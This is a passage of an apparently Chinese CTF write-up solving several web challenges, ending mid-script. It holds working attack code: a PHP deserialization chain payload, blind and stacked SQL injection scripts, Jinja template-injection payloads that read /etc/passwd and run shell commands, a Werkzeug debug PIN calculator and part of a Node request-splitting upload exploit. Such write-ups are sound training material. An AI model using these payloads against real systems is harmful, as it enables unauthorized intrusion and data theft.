\"<script>window.location.href='./index.php?action=update'</script>\";\n\t}\n\telse{\n\t\techo \"<script>window.location.href='./index.php?action=login'</script>\";\n\t}\n}\n?>\n```\n\n```php\n//lib.php\n<?php\nerror_reporting(0);\nsession_start();\nfunction safe($parm){\n    $array= array('union','regexp','load','into','flag','file','insert',\"'\",'\\\\',\"*\",\"alter\");\n    return str_replace($array,'hacker',$parm);\n}\nclass User\n{\n    public $id;\n    public $age=null;\n    public $nickname=null;\n    public function login() {\n        if(isset($_POST['username'])&&isset($_POST['password'])){\n        $mysqli=new dbCtrl();\n        $this->id=$mysqli->login('select id,password from user where username=?');\n        if($this->id){\n        $_SESSION['id']=$this->id;  \n        $_SESSION['login']=1;\n        echo \"你的ID是\".$_SESSION['id'];\n        echo \"你好！\".$_SESSION['token'];\n        echo \"<script>window.location.href='./update.php'</script>\";\n        return $this->id;\n        }\n    }\n}\n    public function update(){\n        $Info=unserialize($this->getNewinfo());\n        $age=$Info->age;\n        $nickname=$Info->nickname;\n        $updateAction=new UpdateHelper($_SESSION['id'], $Info, \"update user SET age=$age,nickname=$nickname where id=\".$_SESSION['id']);\n        //这个功能还没有写完 先占坑\n    }\n    public function getNewInfo(){\n        $age=$_POST['age'];\n        $nickname=$_POST['nickname'];\n        return safe(serialize(new Info($age,$nickname)));\n    }\n    public function __destruct(){\n        return file_get_contents($this->nickname);//危\n    }\n    public function __toString()\n    {\n        $this->nickname->update($this->age);\n        return \"0-0\";\n    }\n}\nclass Info{\n    public $age;\n    public $nickname;\n    public $CtrlCase;\n    public function __construct($age,$nickname){\n        $this->age=$age;\n        $this->nickname=$nickname;\n    }   \n    public function __call($name,$argument){\n        echo $this->CtrlCase->login($argument[0]);\n    }\n}\nClass UpdateHelper{\n    public $id;\n    public $newinfo;\n    public $sql;\n    public function __construct($newInfo,$sql){\n        $newInfo=unserialize($newInfo);\n        $upDate=new dbCtrl();\n    }\n    public function __destruct()\n    {\n        echo $this->sql;\n    }\n}\nclass dbCtrl\n{\n    public $hostname=\"127.0.0.1\";\n    public $dbuser=\"noob123\";\n    public $dbpass=\"noob123\";\n    public $database=\"noob123\";\n    public $name;\n    public $password;\n    public $mysqli;\n    public $token;\n    public function __construct()\n    {\n        $this->name=$_POST['username'];\n        $this->password=$_POST['password'];\n        $this->token=$_SESSION['token'];\n    }\n    public function login($sql)\n    {\n        $this->mysqli=new mysqli($this->hostname, $this->dbuser, $this->dbpass, $this->database);\n        if ($this->mysqli->connect_error) {\n            die(\"连接失败，错误:\" . $this->mysqli->connect_error);\n        }\n        $result=$this->mysqli->prepare($sql);\n        $result->bind_param('s', $this->name);\n        $result->execute();\n        $result->bind_result($idResult, $passwordResult);\n        $result->fetch();\n        $result->close();\n        if ($this->token=='admin') {\n            return $idResult;\n        }\n        if (!$idResult) {\n            echo('用户不存在!');\n            return false;\n        }\n        if (md5($this->password)!==$passwordResult) {\n            echo('密码错误！');\n            return false;\n        }\n        $_SESSION['token']=$this->name;\n        return $idResult;\n    }\n    public function update($sql)\n    {\n        //还没来得及写\n    }\n}\n```\n\n```php\n//login.php\n<?php\nrequire_once('lib.php');\n?>\n<meta http-equiv=\"Content-Type\" content=\"text/html; charset=utf-8\" /> \n<title>login</title>\n<center>\n\t<form action=\"login.php\" method=\"post\" style=\"margin-top: 300\">\n\t\t<h2>百万前端的用户信息管理系统</h2>\n\t\t<h3>半成品系统 留后门的程序员已经跑路</h3>\n        \t\t<input type=\"text\" name=\"username\" placeholder=\"UserName\" required>\n\t\t<br>\n\t\t<input type=\"password\" style=\"margin-top: 20\" name=\"password\" placeholder=\"password\" required>\n\t\t<br>\n\t\t<button style=\"margin-top:20;\" type=\"submit\">登录</button>\n\t\t<br>\n\t\t<img src='img/1.jpg'>大家记得做好防护</img>\n\t\t<br>\n\t\t<br>\n<?php \n$user=new user();\nif(isset($_POST['username'])){\n\tif(preg_match(\"/union|select|drop|delete|insert|\\#|\\%|\\`|\\@|\\\\\\\\/i\", $_POST['username'])){\n\t\tdie(\"<br>Damn you, hacker!\");\n\t}\n\tif(preg_match(\"/union|select|drop|delete|insert|\\#|\\%|\\`|\\@|\\\\\\\\/i\", $_POST['password'])){\n\t\tdie(\"Damn you, hacker!\");\n\t}\n\t$user->login();\n}\n?>\n\t</form>\n</center>\n```\n\n```php\n//update.php\n<?php\nrequire_once('lib.php');\necho '<html>\n<meta charset=\"utf-8\">\n<title>update</title>\n<h2>这是一个未完成的页面，上线时建议删除本页面</h2>\n</html>';\nif ($_SESSION['login']!=1){\n\techo \"你还没有登陆呢！\";\n}\n$users=new User();\n$users->update();\nif($_SESSION['login']===1){\n\trequire_once(\"flag.php\");\n\techo $flag;\n}\n\n?>\n\n```\n\n大意就是获取admin的密码登入就可以拿到flag。主要审计是lib.php\n\n当时审的时候没有注意到`__toString`这个魔法方法，快结束的时候才注意到。主要还是太菜了\n\n__\\_\\_toString:在 PHP 5.2.0 之前，\\_\\_toString() 方法只有在直接使用于 [echo](http://php.net/manual/zh/function.echo.php) 或 [print](http://php.net/manual/zh/function.print.php) 时才能生效。PHP 5.2.0 之后，则可以在任何字符串环境生效（例如通过 [printf()](http://php.net/manual/zh/function.printf.php)，使用 *%s* 修饰符），但不能用于非字符串环境（如使用 *%d* 修饰符）。自 PHP 5.2.0 起，如果将一个未定义 __toString() 方法的对象转换为字符串，会产生 `E_RECOVERABLE_ERROR` 级别的错误。\n\nindex.php是注入不了的。只能在update.php想办法\n\nuser.php中\n\n```php\n$users=new User();\n$users->update();\n```\n\n去查看user类的update方法\n\n```php\npublic function update(){\n        $Info=unserialize($this->getNewinfo());\n        $age=$Info->age;\n        $nickname=$Info->nickname;\n        $updateAction=new UpdateHelper($_SESSION['id'], $Info, \"update user SET age=$age,nickname=$nickname where id=\".$_SESSION['id']);\n        //这个功能还没有写完 先占坑\n    }\n```\n\n这里有unserialize函数，且$this->getNewinfo()可控，存在序列化漏洞\n\n跳转到getNewinfo方法\n\n```php\npublic function getNewInfo(){\n        $age=$_POST['age'];\n        $nickname=$_POST['nickname'];\n        return safe(serialize(new Info($age,$nickname)));\n    }\n```\n\n再跳转到Info类\n\n```php\nclass Info{\n    public $age;\n    public $nickname;\n    public $CtrlCase;\n    public function __construct($age,$nickname){\n        $this->age=$age;\n        $this->nickname=$nickname;\n    }   \n    public function __call($name,$argument){\n        echo $this->CtrlCase->login($argument[0]);\n    }\n}\n```\n\n这里如果$this->CtrlCase是dbCtrl类的实例魔法方法__call可以调用到dbCtrl::logon（）\n\n且在User::getNewInfo方法中调用了一个safe过滤函数\n\n```php\nfunction safe($parm){\n    $array= array('union','regexp','load','into','flag','file','insert',\"'\",'\\\\',\"*\",\"alter\");\n    return str_replace($array,'hacker',$parm);\n```\n\n存在序列化字符串逃逸漏洞\n\n执行完后，回到User::update方法\n\n```php\npublic function update(){\n        $Info=unserialize($this->getNewinfo());\n        $age=$Info->age;\n        $nickname=$Info->nickname;\n        $updateAction=new UpdateHelper($_SESSION['id'], $Info, \"update user SET age=$age,nickname=$nickname where id=\".$_SESSION['id']);\n        //这个功能还没有写完 先占坑\n    }\n```\n\n跳转到UpdateHelper类\n\n```php\nClass UpdateHelper{\n    public $id;\n    public $newinfo;\n    public $sql;\n    public function __construct($newInfo,$sql){\n        $newInfo=unserialize($newInfo);\n        $upDate=new dbCtrl();\n    }\n    public function __destruct()\n    {\n        echo $this->sql;\n    }\n}\n```\n\n如果$this->sql是一个类对象会触发User::\\_\\_toString方法\n\n```php\npublic function __toString()\n{\n    $this->nickname->update($this->age);\n    return \"0-0\";\n}\n```\n\n有update方法的只有dbCtrl类，但是Info类中有一个魔法调用\n\n```php\npublic function __call($name,$argument){\n        echo $this->CtrlCase->login($argument[0]);\n    }\n```\n\n如果让User类中的$this->nickname为dbCtrl类的实例就调用到dbCtrl::login方法，而且$sql可控\n\n```php\npublic function login($sql)\n    {\n        $this->mysqli=new mysqli($this->hostname, $this->dbuser, $this->dbpass, $this->database);\n        if ($this->mysqli->connect_error) {\n            die(\"连接失败，错误:\" . $this->mysqli->connect_error);\n        }\n        $result=$this->mysqli->prepare($sql);\n        $result->bind_param('s', $this->name);\n        $result->execute();\n        $result->bind_result($idResult, $passwordResult);\n        $result->fetch();\n        $result->close();\n        if ($this->token=='admin') {\n            return $idResult;\n        }\n        if (!$idResult) {\n            echo('用户不存在!');\n            return false;\n        }\n        if (md5($this->password)!==$passwordResult) {\n            echo('密码错误！');\n            return false;\n        }\n        $_SESSION['token']=$this->name;\n        return $idResult;\n    }\n```\n\n附上脚本\n\n```php\n<?php\nclass Info{\n    public $age;\n    public $nickname;\n    public $CtrlCase;\n\n\n}\n\nclass User\n{\n    public $id;\n    public $age;\n    public $nickname;\n    function __construct()\n    {\n        $this->age='select password,id from user where username=?';\n        $this->nickname=new Info();\n        $this->nickname->CtrlCase=new dbCtrl();\n        $this->nickname->nickname='';\n\n    }\n\n}\nclass dbCtrl\n{\n    public $hostname=\"127.0.0.1\";\n    public $dbuser=\"root\";\n    public $dbpass=\"root\";\n    public $database=\"test\";\n    public $name='admin';\n    public $password='1';\n    public $mysqli;\n    public $token='admin';\n\n}\nClass UpdateHelper\n{\n    public $id;\n    public $newinfo;\n    public $sql;\n    function __construct()\n    {\n        $this->sql=new User();\n    }\n}\n\n$test=new UpdateHelper();\n$a=new Info();\n$a->nickname='';\n$a->CtrlCase=$test;\necho urldecode('%09');\necho serialize($a);\n//O:4:\"Info\":3:{s:3:\"age\";N;s:8:\"nickname\";s:0:\"\n\";s:8:\"CtrlCase\";O:12:\"UpdateHelper\":3:{s:2:\"id\";N;s:7:\"newinfo\";N;s:3:\"sql\";O:4:\"User\":3:{s:2:\"id\";N;s:3:\"age\";s:45:\"select password,id from user where username=?\";s:8:\"nickname\";O:4:\"Info\":3:{s:3:\"age\";N;s:8:\"nickname\";s:0:\"\";s:8:\"CtrlCase\";O:6:\"dbCtrl\":8:{s:8:\"hostname\";s:9:\"127.0.0.1\";s:6:\"dbuser\";s:4:\"root\";s:6:\"dbpass\";s:4:\"root\";s:8:\"database\";s:4:\"test\";s:4:\"name\";s:5:\"admin\";s:8:\"password\";s:1:\"1\";s:6:\"mysqli\";N;s:5:\"token\";s:5:\"admin\";}}}}}\n```\n\n使用相应长度的字符逃逸\n\n```http\nage=&nickname=******************************************************************************************flagflag\";s:8:\"CtrlCase\";O:12:\"UpdateHelper\":3:{s:2:\"id\";N;s:7:\"newinfo\";N;s:3:\"sql\";O:4:\"User\":3:{s:2:\"id\";N;s:3:\"age\";s:45:\"select password,id from user where username=?\";s:8:\"nickname\";O:4:\"Info\":3:{s:3:\"age\";N;s:8:\"nickname\";s:0:\"\";s:8:\"CtrlCase\";O:6:\"dbCtrl\":8:{s:8:\"hostname\";s:9:\"127.0.0.1\";s:6:\"dbuser\";s:4:\"root\";s:6:\"dbpass\";s:4:\"root\";s:8:\"database\";s:4:\"test\";s:4:\"name\";s:5:\"admin\";s:8:\"password\";s:1:\"1\";s:6:\"mysqli\";N;s:5:\"token\";s:5:\"admin\";}}}}}\n```\n\n得到MD5，解密，登录即可拿到flag\n\n\n\n# easysqli_copy\n\n打开题目就是源码\n\n```python\n<?php \n    function check($str)\n    {\n        if(preg_match('/union|select|mid|substr|and|or|sleep|benchmark|join|limit|#|-|\\^|&|database/i',$str,$matches))\n        {\n            print_r($matches);\n            return 0;\n        }\n        else\n        {\n            return 1;\n        }\n    }\n    try\n    {\n        $db = new PDO('mysql:host=localhost;dbname=pdotest','root','******');\n    } \n    catch(Exception $e)\n    {\n        echo $e->getMessage();\n    }\n    if(isset($_GET['id']))\n    {\n        $id = $_GET['id'];\n    }\n    else\n    {\n        $test = $db->query(\"select balabala from table1\");\n        $res = $test->fetch(PDO::FETCH_ASSOC);\n        $id = $res['balabala'];\n    }\n    if(check($id))\n    {\n        $query = \"select balabala from table1 where 1=?\";\n        $db->query(\"set names gbk\");\n        $row = $db->prepare($query);\n        $row->bindParam(1,$id);\n        $row->execute();\n    }\n```\n\n没有能在题目结束之前解出来，后面看到一篇[文章](http://www.52bug.cn/hkjs/6152.html)，之前也看到一篇文章，不过只有上半部分。使用预编译加上16禁止就可以绕过\n\n编写盲注脚本\n\n```python\n# -*- coding: utf-8 -*-\nimport requests\nimport time\n\ndef get(payload):\n    url = 'http://localhost/1.php?id=1%df%27;set%20@x='+payload+';prepare%20a%20from%20@x;EXECUTE%20a;'\n    html = requests.get(url)\n    # print(url)\n    # print(html)\n    # return html\n\ndef str2hex(strs):\n    he='0x'\n    for x in strs:\n        he+=hex(ord(x))[2:]\n    # print(he)\n    return he\n\ndef binsea(s_payload,len=999):\n    result = ''\n    x=1\n    while x <= len :\n        error = 0\n        left = 0\n        right = 126\n        while left <= right:\n            mid = (left + right) / 2\n            payload = \"select if(ascii(substr((%s),%d,1))>%d,sleep(1),1)\" % (s_payload,x, mid)\n            payload=str2hex(payload)\n            t1=time.time()\n            res = get(payload)\n            # if res.status_code == 404 or res.status_code == 429:\n            #     x=x-1\n            #     error = 1\n            #     break\n            # html=res.text\n            # print('*-*-*-*-*-*', mid)\n            if time.time()-t1>=1:\n                left = mid +1\n            else:\n                right = mid -1\n        mid = int((left + right + 1) / 2)\n        if mid == 0 :\n            break\n        if error == 0 :\n            result += chr(mid)\n            print(result)\n        x=x+1\n    return result\n\ndef get_database():\n    s_payload='database()'\n    database = binsea(s_payload)\n    print(database)\n\ndef get_tabls(db):\n    s_payload = 'select(group_concat(table_name))from(information_schema.tables)where(table_schema=\\''+db+'\\')'\n    tables=binsea(s_payload)\n\ndef get_columns(table):\n    s_payload = 'select(group_concat(column_name))from(information_schema.columns)where(table_name=\\''+table+'\\')'\n    columns=binsea(s_payload)\n\ndef get_data(columns,table):\n    s_payload='select group_concat('+columns+') from '+table\n    password=binsea(s_payload)\n\n\nget_data('flag','table1')\n```\n\n\n\n\n\n\n\n# blacklist\n\n打开题目是一个提交框，是强网杯 2019随便注改过来的，但是禁止了set，prepare，alter，rename。改表，预处理是不行了。\n\n测试时发现\n\n```php\npreg_match(\"/set|prepare|alter|rename|select|update|delete|drop|insert|where|\\./i\",$inject);\n```\n\n存在堆叠注入\n\n```\n/?inject=1%27||id;show tables;desc words;desc FlagHere;\n```\n\n返回结果如下\n\n```php+HTML\narray(2) {\n  [0]=>\n  string(1) \"1\"\n  [1]=>\n  string(7) \"hahahah\"\n}\n\narray(2) {\n  [0]=>\n  string(1) \"2\"\n  [1]=>\n  string(12) \"miaomiaomiao\"\n}\n\narray(2) {\n  [0]=>\n  string(6) \"114514\"\n  [1]=>\n  string(2) \"ys\"\n}\n\narray(1) {\n  [0]=>\n  string(8) \"FlagHere\"\n}\n\narray(1) {\n  [0]=>\n  string(5) \"words\"\n}\n\narray(6) {\n  [0]=>\n  string(2) \"id\"\n  [1]=>\n  string(7) \"int(10)\"\n  [2]=>\n  string(2) \"NO\"\n  [3]=>\n  string(0) \"\"\n  [4]=>\n  NULL\n  [5]=>\n  string(0) \"\"\n}\n\narray(6) {\n  [0]=>\n  string(4) \"data\"\n  [1]=>\n  string(11) \"varchar(20)\"\n  [2]=>\n  string(2) \"NO\"\n  [3]=>\n  string(0) \"\"\n  [4]=>\n  NULL\n  [5]=>\n  string(0) \"\"\n}\n\narray(6) {\n  [0]=>\n  string(4) \"flag\"\n  [1]=>\n  string(12) \"varchar(100)\"\n  [2]=>\n  string(2) \"NO\"\n  [3]=>\n  string(0) \"\"\n  [4]=>\n  NULL\n  [5]=>\n  string(0) \"\"\n}\n```\n\nflag 在FlagHere表中的flag列，经过测试语句应该是\n\n```\n'select data from words where id=$_GET[id]'\n```\n\n需要跨表查询，由于select被过滤，但是mysql还有一个handler可以使用（打比赛的时候没有找到，太可惜了）\n\n```\npayload：1'; handler FlagHere open; handler FlagHere read first; handler FlagHere close;#\n```\n\n如果表名是数字需要使用反撇号包裹。\n\n\n\n\n\n# Ezsqli\n\n 是一个提交窗口，经过测试过滤了如下字符0\n\n![](/pic/111.png)\n\n后面又测试了一次，发现单独的or没有被过滤，*or就被过滤了\n\n![](/pic/112.png)\n\ninformation_schema.tables可以使用`sys.schema_table_statistics_with_buffer`或`sys.schema_table_statistics_with_buffer`代替。\n\n数据使用无列名注入\n\n首先盲注获取数据库名\n\n附上脚本\n\n```python\n# -*- coding: utf-8 -*-\n# @Time    : 2/24/2020 11:21 AM\n\nimport requests\nimport time\nimport string\n\ndef str2hex(strs):\n    hexs='0x'\n    for x in range(len(strs)):\n        hexs+=hex(ord(strs[x]))[2:]\n    # print(hexs)\n    return hexs\n\ndef get(payload):\n    url='http://0445a30e864f4cd8a6e4a54b3043663dd97491883a5749df.changame.ichunqiu.com/'\n    # print(url)\n\n    data={\n        'id':'0^('+payload+')'\n    }\n    html = requests.post(url,data=data)\n    print(data)\n    return html\n\ndef binsea(s_payload,len=999):\n    result = ''\n    x=1\n    while x <= len :\n        error = 0\n        left = 0\n        right = 126\n        while left <= right:\n            mid = (left + right) / 2\n            payload = \"ascii(substr((%s),%d,1))>%d\" % (s_payload,x, mid)\n            # t1=time.time()\n            res = get(payload)\n            if res.status_code == 404 or res.status_code == 429:\n                x=x-1\n                error = 1\n                break\n            html=res.text\n            # print(html,'*-*-*-*-*-*', mid,'    ',payload)\n            if 'Nu1L' in html:\n                left = mid +1\n            else:\n                right = mid -1\n        mid = int((left + right + 1) / 2)\n        if mid == 0 :\n            break\n        if error == 0 :\n            result += chr(mid)\n            print(result)\n        x=x+1\n    return result\n\ndef get_database():\n    s_payload='database()'\n    database = binsea(s_payload)\n    # print(database)\n\ndef get_tables(db):\n    db=str2hex(db)\n    s_payload = 'select(group_concat(table_name))from(sys.schema_table_statistics_with_buffer)where(table_schema='+db+')'\n    tables=binsea(s_payload)\n\ndef get_columns(table):\n    table = str2hex(table)\n    s_payload = 'select(group_concat(column_name))from(information_schema.columns)where(table_name='+table+')'\n    columns=binsea(s_payload)\n\ndef get_data(columns,table):\n    s_payload='select(group_concat('+columns+'))from('+table+')'\n    password=binsea2(s_payload)\n\ndef binsea2(length=999):\n    result = ''\n    x=1\n    dic='-'+'0123456789'+string.ascii_lowercase+'{}~'\n    while x <= length :\n        error = 0\n        for each in range(len(dic)):\n            payload = \"select (select 1,{})>(select * from f1ag_1s_h3r3_hhhhh)\".format(str2hex(result+dic[each]))\n            print(result+dic[each])\n            # t1=time.time()\n            res = get(payload)\n            if res.status_code == 404 or res.status_code == 429:\n                x=x-1\n                error = 1\n                break\n            html=res.text\n            # print(html[0:-6])\n            if error == 0 and 'Nu1L' in html:\n                result +=dic[each-1]\n                print(result)\n                break\n        x = x + 1\n    return result\n\n\n# get_database() #ctf\n\n# get_tables('ctf')#users233333333333333,f1ag_1s_h3r3_hhhhh\n\nbinsea2()\n```\n\n\n\n\n\n# Flaskapp\n\n打开题目\n\n在解密中随意输入几个，让其报错，爆出部分代码，发现是一个flask框架写的base64的加解密小工具运行在PYTHON3.7。\n\n```python\n@app.route('/decode',methods=['POST','GET'])\n\ndef decode():\n    if request.values.get('text') :\n        text = request.values.get(\"text\")\n        text_decode = base64.b64decode(text.encode())\n        tmp = \"结果 ： {0}\".format(text_decode.decode())\n        if waf(tmp) :\n            flash(\"no no no !!\")\n            return redirect(url_for('decode'))\n        res =  render_template_string(tmp)\n        flash( res )\n        return redirect(url_for('decode'))\n\n    else :\n         text = \"\"\n```\n\n是模板注入，然后还有一个过滤，还能打开python交互界面但是有密码\n\n![](/pic/114.png)\n\n任意文件读取\n\n```pyhton\n{{().__class__.__bases__[0].__subclasses__()[75].__init__.__globals__.__builtins__['open']('/etc/passwd').read()}}\nbase64后\ne3soKS5fX2NsYXNzX18uX19iYXNlc19fWzBdLl9fc3ViY2xhc3Nlc19fKClbNzVdLl9faW5pdF9fLl9fZ2xvYmFsc19fLl9fYnVpbHRpbnNfX1snb3BlbiddKCcvZXRjL3Bhc3N3ZCcpLnJlYWQoKX19\n```\n\n结果为\n\n![](/pic/115.png)\n\n提取/app/app.py所有代码\n\n```python\nfrom flask import Flask,render_template_string\nfrom flask import render_template,request,flash,redirect,url_for\nfrom flask_wtf import FlaskForm\nfrom wtforms import StringField, SubmitField\nfrom wtforms.validators import DataRequired\nfrom flask_bootstrap import Bootstrap\nimport base64\n\napp = Flask(__name__)\napp.config['SECRET_KEY'] = 's_e_c_r_e_t_k_e_y'\nbootstrap = Bootstrap(app)\n\nclass NameForm(FlaskForm):\n    text = StringField('BASE64加密',validators= [DataRequired()])\n    submit = SubmitField('提交')\nclass NameForm1(FlaskForm):\n    text = StringField('BASE64解密',validators= [DataRequired()])\n    submit = SubmitField('提交')\n\ndef waf(str):\n    black_list = [\"flag\",\"os\",\"system\",\"popen\",\"import\",\"eval\",\"chr\",\"request\",\n                  \"subprocess\",\"commands\",\"socket\",\"hex\",\"base64\",\"*\",\"?\"]\n    for x in black_list :\n        if x in str.lower() :\n            return 1\n\n\n@app.route('/hint',methods=['GET'])\ndef hint():\n    txt = \"失败乃成功之母！！\"\n    return render_template(\"hint.html\",txt = txt)\n\n\n@app.route('/',methods=['POST','GET'])\ndef encode():\n    if request.values.get('text') :\n        text = request.values.get(\"text\")\n        text_decode = base64.b64encode(text.encode())\n        tmp = \"结果  :{0}\".format(str(text_decode.decode()))\n        res =  render_template_string(tmp)\n        flash(tmp)\n        return redirect(url_for('encode'))\n\n    else :\n        text = \"\"\n        form = NameForm(text)\n        return render_template(\"index.html\",form = form ,method = \"加密\" ,img = \"flask.png\")\n\n@app.route('/decode',methods=['POST','GET'])\ndef decode():\n    if request.values.get('text') :\n        text = request.values.get(\"text\")\n        text_decode = base64.b64decode(text.encode())\n        tmp = \"结果 ： {0}\".format(text_decode.decode())\n        if waf(tmp) :\n            flash(\"no no no !!\")\n            return redirect(url_for('decode'))\n        res =  render_template_string(tmp)\n        flash( res )\n        return redirect(url_for('decode'))\n\n    else :\n        text = \"\"\n        form = NameForm1(text)\n        return render_template(\"index.html\",form = form, method = \"解密\" , img = \"flask1.png\")\n\n\n@app.route('/<name>',methods=['GET'])\ndef not_found(name):\n    return render_template(\"404.html\",name = name)\n\nif __name__ == '__main__':\n    app.run(host=\"0.0.0.0\", port=5000, debug=True)\n```\n\n可以看见黑名单\n\n```python\n[\"flag\",\"os\",\"system\",\"popen\",\"import\",\"eval\",\"chr\",\"request\",\n                  \"subprocess\",\"commands\",\"socket\",\"hex\",\"base64\",\"*\",\"?\"]\n```\n\n\n\n直接上Vulhub的payload修改一下\n\n```python\n{% for c in [].__class__.__base__.__subclasses__() %}\n{% if c.__name__ == 'catch_warnings' %}\n  {% for b in c.__init__.__globals__.values() %}\n  {% if b.__class__ == {}.__class__ %}\n    {% if 'ev'+'al' in b.keys() %}\n      {{ b['eva'+'l']('__imp'+'ort__(\"o\"+\"s\").pop'+'en(\"id\").read()') }}\n    {% endif %}\n  {% endif %}\n  {% endfor %}\n{% endif %}\n{% endfor %}\n```\n\n查看目录  ls\n\n```bash\napp bin boot dev etc home lib lib64 media mnt opt proc requirements.txt root run sbin srv sys this_is_the_flag.txt tmp usr var \n```\n\n查看flag   cat this_is_the_fl\"+\"ag.txt\n\n```\nflag{93df69f0-3005-414f-a119-c5562af1b167} \n```\n\n想通过计算PIN，但是获取所有信息后计算出来不一致。\n\n\n\n### 另一种解法\n\n计算PIN [参考链接](https://xz.aliyun.com/t/2553)\n\n需要获取六个变量的值\n\n```python\nusername # 用户名\n\nmodname # flask.app\n\ngetattr(app, '__name__', getattr(app.__class__, '__name__')) # Flask\n\ngetattr(mod, '__file__', None) # flask目录下的一个app.py的绝对路径\n\nuuid.getnode() # mac地址十进制  02:42:ae:00:cf:18->2485410385688\n\nget_machine_id() # /etc/machine-id   这里是/proc/self/cgroup  \n12:blkio:/docker/29747fd95662eedc0f932bdacd32401f736d1ebff306b24046b30b43aa287b76 \n```\n\n计算脚本\n\n```python\nimport hashlib\nfrom itertools import chain\nprobably_public_bits = [\n    'flaskweb',# username\n    'flask.app',# modname\n    'Flask',# getattr(app, '__name__', getattr(app.__class__, '__name__'))\n    '/usr/local/lib/python3.7/site-packages/flask/app.py' # getattr(mod, '__file__', None),\n]\n\nprivate_bits = [\n    '2485410385688',# str(uuid.getnode()),  /sys/class/net/eth0/address\n    '29747fd95662eedc0f932bdacd32401f736d1ebff306b24046b30b43aa287b76'# get_machine_id(), /etc/machine-id\n]\n\nh = hashlib.md5()\nfor bit in chain(probably_public_bits, private_bits):\n    if not bit:\n        continue\n    if isinstance(bit, str):\n        bit = bit.encode('utf-8')\n    h.update(bit)\nh.update(b'cookiesalt')\n\ncookie_name = '__wzd' + h.hexdigest()[:20]\n\nnum = None\nif num is None:\n    h.update(b'pinsalt')\n    num = ('%09d' % int(h.hexdigest(), 16))[:9]\n\nrv =None\nif rv is None:\n    for group_size in 5, 4, 3:\n        if len(num) % group_size == 0:\n            rv = '-'.join(num[x:x + group_size].rjust(group_size, '0')\n                          for x in range(0, len(num), group_size))\n            break\n    else:\n        rv = num\n\nprint(rv)\n```\n\n拿到pin登录\n\n```python\n[console ready]>>> import os\n>>> os.popen(\"ls /\").read()\n'app\\nbin\\nboot\\ndev\\netc\\nhome\\nlib\\nlib64\\nmedia\\nmnt\\nopt\\nproc\\nroot\\nrun\\nsbin\\nsrv\\nsys\\nthis_is_the_flag.txt\\ntmp\\nusr\\nvar\\n'  \n>>> os.popen(\"cat /this_is_the_flag.txt\").read()\n'flag{033e49d3-6201-41c6-9725-e95898cbc3d9}\\n'\n```\n\n\n\n# node_game\n\n经过查找资料，本题是改自于hackim-2020，[出题师傅博客](http://blog.5am3.com/2020/02/11/ctf-node1/)\n\n**题目提示 node 版本为8.12.0**\n\n打开题目有两个选项\n\n![](/pic/117.png)\n\n选择Only admin can use this\n\n是一个文件上传的界面\n\n![](/pic/116.png)\n\n选择Click here to get the source可以查看源码，总共有四条路由和一个黑名单函数\n\n黑名单函数检测下列字符\n\n```\n\"global\",\"process\",\"mainModule\",\"require\",\"root\",\"child_process\",\"exec\",\"\\\"\",\"'\",\"!\"\n```\n\n根路由是获取pug文件渲染后的页面\n\n```js\napp.get('/', function(req, res) {\n    var action = req.query.action?req.query.action:\"index\";\n    if( action.includes(\"/\") || action.includes(\"\\\\\") ){   //action不能包含 ‘/’和‘\\\\’\n        res.send(\"Errrrr, You have been Blocked\");\n    }\n    file = path.join(__dirname + '/template/'+ action +'.pug');\n    var html = pug.renderFile(file);\n    res.send(html);\n});\n```\n\n一条是显示源码\n\n```js\napp.get('/source', function(req, res) {\n    res.sendFile(path.join(__dirname + '/template/source.txt'));\n});\n```\n\n一条是上传文件\n\n```js\napp.post('/file_upload', function(req, res){\n    var ip = req.connection.remoteAddress;\n    var obj = {\n        msg: '',\n    }\n    if (!ip.includes('127.0.0.1')) {   //保证地址是127.0.0.1\n        obj.msg=\"only admin's ip can use it\"\n        res.send(JSON.stringify(obj));\n        return \n    }\n    fs.readFile(req.files[0].path, function(err, data){   //读取文件内容，读取的数据放到data中\n        if(err){\n            obj.msg = 'upload failed';  \n            res.send(JSON.stringify(obj));   //如果读取失败，返回upload failed\n        }else{\n            var file_path = '/uploads/' + req.files[0].mimetype +\"/\";   //file_path为 /uploads/ 加上上传时的Content-Type\n            var file_name = req.files[0].originalname   //file_name为上传时的文件名\n            var dir_file = __dirname + file_path + file_name\n            if(!fs.existsSync(__dirname + file_path)){  \n                try {\n                    fs.mkdirSync(__dirname + file_path)  //检查路径是否存在，如果不存在就创建 \n                } catch (error) {\n                    obj.msg = \"file type error\";\n                    res.send(JSON.stringify(obj));\n                    return\n                }\n            }\n            try {\n                fs.writeFileSync(dir_file,data)  //向上传的文件中写入数据\n                obj = {\n                    msg: 'upload success',\n                    filename: file_path + file_name\n                } \n            } catch (error) {\n                obj.msg = 'upload failed';\n            }\n            res.send(JSON.stringify(obj));    \n        }\n    })\n})\n```\n\n还有一条是代理访问`http://localhost:8081/source`\n这一条就刚好解决了文件上传的IP不是127.0.0.1的问题。\n\n```js\napp.get('/core', function(req, res) {\n    var q = req.query.q;  //获取参数q\n    var resp = \"\";\n    if (q) {\n        var url = 'http://localhost:8081/source?' + q  \n        console.log(url)  //终端打印url\n        var trigger = blacklist(url);  \n        if (trigger === true) {   \n            res.send(\"<p>error occurs!</p>\");   //url中不能包含黑名单中字符，也就是参数q不能包含\n        } else {\n            try {\n                http.get(url, function(resp) {\n                    resp.setEncoding('utf8');\n                    resp.on('error', function(err) {  //处理response流中的error事件\n                    if (err.code === \"ECONNRESET\") {\n                     console.log(\"Timeout occurs\");\n                     return;\n                    }\n                   });\n\n                    resp.on('data', function(chunk) {   ////处理response流中的data事件\n                        try {\n                         resps = chunk.toString();\n                         res.send(resps);\n                        }catch (e) {\n                           res.send(e.message);\n                        }\n \n                    }).on('error', (e) => {\n                         res.send(e.message);});\n                });\n            } catch (error) {\n                console.log(error);\n            }\n        }\n    } else {\n        res.send(\"search param 'q' missing!\");\n    }\n})\n\n```\n\n题目提示了node版本，搜索发现  此版本的http.get存在漏洞\nhttps://xz.aliyun.com/t/2894#toc-2\n\n翻阅pug文档https://pugjs.bootcss.com/language/includes.html\n\n包含flag文件\n\n```\ndoctype html\nhtml\n  head\n    style\n      include ../../../../../../../../../../../flag.txt\n```\n\n使用文件上传路由，然后抓包，再修改一下\n\n>尝试自己编写脚本，但是一直报错，待更新\n\n\n\n附上赵师傅的脚本\n\n```python\nimport urllib.parse\nimport requests\n\npayload = ''' HTTP/1.1\nHost: x\nConnection: keep-alive\n\nPOST /file_upload HTTP/1.1\nContent-Type: multipart/form-data; boundary=--------------------------919695033422425209299810\nConnection: keep-alive\ncache-control: no-cache\nHost: x\nContent-Length: 292\n\n----------------------------919695033422425209299810\nContent-Disposition: form-data; name=\"file\"; 